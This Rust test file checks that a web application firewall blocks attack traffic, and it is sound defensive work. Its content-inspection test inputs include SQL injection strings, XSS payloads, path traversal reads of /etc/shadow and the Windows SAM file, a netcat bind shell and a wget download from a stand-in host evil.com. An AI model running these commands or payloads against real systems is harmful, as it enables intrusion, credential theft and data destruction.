use std::net::IpAddr;
use std::str::FromStr;
use hyper::{Method, Uri, HeaderMap, header::{USER_AGENT, CONTENT_TYPE}};
use bytes::Bytes;

use waf_ingress::waf::{WafEngine, RequestContext, Decision};
use waf_ingress::waf::security_events::{SecurityEventLogger, ThreatLevel};
use waf_ingress::waf::content_inspection::{ContentInspectionRuleFactory, ThreatPattern};
use waf_ingress::waf::geoip::{GeoBlockingRuleFactory, GeoIpService};
use waf_ingress::config::Config;

/// Test the complete WAF engine with all security features enabled
#[tokio::test]
async fn test_comprehensive_waf_protection() {
    let config = Config::default();
    let mut engine = WafEngine::with_config(&config);
    
    // Add comprehensive security rules
    add_security_rules(&mut engine);
    
    // Test cases that should be blocked
    let test_cases = vec![
        // SQL injection attempts
        create_request_with_query("1' OR '1'='1", "sql_injection_attempt"),
        create_request_with_body("admin'; DROP TABLE users; --", "sql_injection_body"),
        
        // XSS attempts
        create_request_with_query("<script>alert('xss')</script>", "xss_query"),
        create_request_with_header(USER_AGENT, "<img src=x onerror=alert(1)>", "xss_header"),
        
        // Command injection
        create_request_with_query("test; cat /etc/passwd", "command_injection"),
        create_request_with_body("file=../../etc/shadow", "path_traversal"),
        
        // Known malicious IPs (simulated)
        create_request_from_ip("192.168.1.100", "malicious_ip"),
    ];
    
    let mut blocked_count = 0;
    let mut allowed_count = 0;
    
    for (request, test_name) in test_cases {
        let decision = engine.evaluate(&request);
        match decision {
            Decision::Block { status, reason } => {
                println!("✅ {} - Blocked: {} (status: {})", test_name, reason, status);
                blocked_count += 1;
            }
            Decision::RateLimit { reason } => {
                println!("✅ {} - Rate Limited: {}", test_name, reason);
                blocked_count += 1;
            }
            Decision::Allow => {
                println!("❌ {} - Unexpectedly allowed", test_name);
                allowed_count += 1;
            }
        }
    }
    
    println!("\nSecurity Test Results:");
    println!("  Blocked/Rate Limited: {}", blocked_count);
    println!("  Unexpectedly Allowed: {}", allowed_count);
    
    // Most malicious requests should be blocked
    assert!(blocked_count > allowed_count, 
            "Expected more requests to be blocked than allowed");
}

/// Test security event logging functionality
#[test]
fn test_security_event_logging() {
    let logger = SecurityEventLogger::new();
    
    // Test different threat levels
    let events = vec![
        ("sql_injection", ThreatLevel::High, "SQL injection detected in query parameter"),
        ("rate_limit", ThreatLevel::Medium, "Rate limit exceeded for IP"),
        ("suspicious_user_agent", ThreatLevel::Low, "Unusual user agent pattern"),
        ("ddos_attempt", ThreatLevel::Critical, "DDoS attack pattern detected"),
    ];
    
    for (event_type, level, message) in events {
        let event = waf_ingress::waf::security_events::SecurityEvent::new(
            event_type.to_string(),
            level,
            message.to_string(),
        )
        .with_source_ip(IpAddr::from_str("203.0.113.1").unwrap())
        .with_request_method("GET".to_string())
        .with_request_uri("/api/data".to_string());
        
        // This should not panic - actual logging would go to configured output
        logger.log_event(&event);
    }
    
    println!("✅ Security event logging test completed");
}

/// Test geographic IP blocking
#[test]
fn test_geo_blocking() {
    let geoip_service = std::sync::Arc::new(GeoIpService::new());
    
    // Create geographic blocking rules
    let country_rule = GeoBlockingRuleFactory::create_country_rule(
        "CN", // Block China
        std::sync::Arc::clone(&geoip_service),
    );
    
    let tor_rule = GeoBlockingRuleFactory::create_tor_blocking_rule(
        std::sync::Arc::clone(&geoip_service),
    );
    
    // Test with various IP addresses
    let test_ips = vec![
        ("8.8.8.8", "US IP should be allowed"),
        ("1.2.3.4", "Generic IP test"),
        ("127.0.0.1", "Localhost should be allowed"),
    ];
    
    for (ip_str, description) in test_ips {
        let ip = IpAddr::from_str(ip_str).unwrap();
        let context = RequestContext::new(
            ip,
            Method::GET,
            Uri::from_str("/test").unwrap(),
            HeaderMap::new(),
            None,
        );
        
        let country_decision = country_rule.evaluate(&context);
        let tor_decision = tor_rule.evaluate(&context);
        
        println!("{}: Country rule: {:?}, Tor rule: {:?}", 
                description, country_decision, tor_decision);
    }
    
    println!("✅ Geographic blocking test completed");
}

/// Test content inspection with various threat patterns
#[test]
fn test_content_inspection_patterns() {
    let patterns = vec![
        ("sql_injection", vec![
            "SELECT * FROM users WHERE id = 1; DROP TABLE users; --",
            "admin' OR '1'='1' --",
            "1' UNION SELECT password FROM accounts --",
        ]),
        ("xss", vec![
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
        ]),
        ("command_injection", vec![
            "test; cat /etc/passwd",
            "| nc -l -p 1234 -e /bin/sh",
            "&& wget http://evil.com/backdoor.sh",
        ]),
        ("path_traversal", vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]),
    ];
    
    let mut total_detected = 0;
    let mut total_tested = 0;
    
    for (pattern_name, test_inputs) in patterns {
        let rule = ContentInspectionRuleFactory::create_threat_rule(pattern_name);
        let mut detected_count = 0;
        
        for input in test_inputs {
            let context = create_request_with_body(input, &format!("{}_{}", pattern_name, total_tested));
            let decision = rule.evaluate(&context);
            
            if matches!(decision, Decision::Block { .. }) {
                detected_count += 1;
                total_detected += 1;
            }
            total_tested += 1;
        }
        
        println!("{}: Detected {}/{} threats", pattern_name, detected_count, 3);
    }
    
    println!("\nContent Inspection Results:");
    println!("  Total threats detected: {}/{}", total_detected, total_tested);
    
    // Should detect most threats
    assert!(total_detected > total_tested / 2, 
            "Expected to detect majority of threat patterns");
}

// Helper functions for creating test requests

fn add_security_rules(engine: &mut WafEngine) {
    use std::sync::Arc;
    
    // Add content inspection rules
    let threat_patterns = ["sql_injection", "xss", "command_injection", "path_traversal"];
    for pattern in &threat_patterns {
        let rule = ContentInspectionRuleFactory::create_threat_rule(pattern);
        engine.add_rule(rule);
    }
    
    // Add geographic blocking (example)
    let geoip_service = Arc::new(GeoIpService::new());
    let geo_rule = GeoBlockingRuleFactory::create_tor_blocking_rule(geoip_service);
    engine.add_rule(geo_rule);
}

fn create_request_with_query(query: &str, _test_name: &str) -> RequestContext {
    let uri = Uri::from_str(&format!("/test?param={}", urlencoding::encode(query))).unwrap();
    RequestContext::new(
        IpAddr::from_str("203.0.113.1").unwrap(),
        Method::GET,
        uri,
        HeaderMap::new(),
        None,
    )
}

fn create_request_with_body(body: &str, _test_name: &str) -> RequestContext {
    let mut headers = HeaderMap::new();
    headers.insert(CONTENT_TYPE, "application/x-www-form-urlencoded".parse().unwrap());
    
    RequestContext::new(
        IpAddr::from_str("203.0.113.1").unwrap(),
        Method::POST,
        Uri::from_str("/submit").unwrap(),
        headers,
        Some(body.len()),
    ).with_body(Some(Bytes::from(body.to_string())))
}

fn create_request_with_header(header_name: hyper::header::HeaderName, header_value: &str, _test_name: &str) -> RequestContext {
    let mut headers = HeaderMap::new();
    headers.insert(header_name, header_value.parse().unwrap());
    
    RequestContext::new(
        IpAddr::from_str("203.0.113.1").unwrap(),
        Method::GET,
        Uri::from_str("/test").unwrap(),
        headers,
        None,
    )
}

fn create_request_from_ip(ip_str: &str, _test_name: &str) -> RequestContext {
    RequestContext::new(
        IpAddr::from_str(ip_str).unwrap(),
        Method::GET,
        Uri::from_str("/test").unwrap(),
        HeaderMap::new(),
        None,
    )
}
